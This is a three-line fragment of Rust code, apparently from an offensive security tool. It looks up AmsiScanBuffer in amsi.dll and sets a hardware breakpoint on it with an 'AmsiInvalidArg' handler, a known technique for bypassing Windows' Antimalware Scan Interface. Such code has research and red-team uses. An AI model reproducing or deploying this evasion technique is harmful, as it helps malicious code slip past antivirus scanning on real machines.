        crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer").ok_or("amsi not loaded")?;
    add_hwbp(addr, ShadowType::AmsiInvalidArg)
}
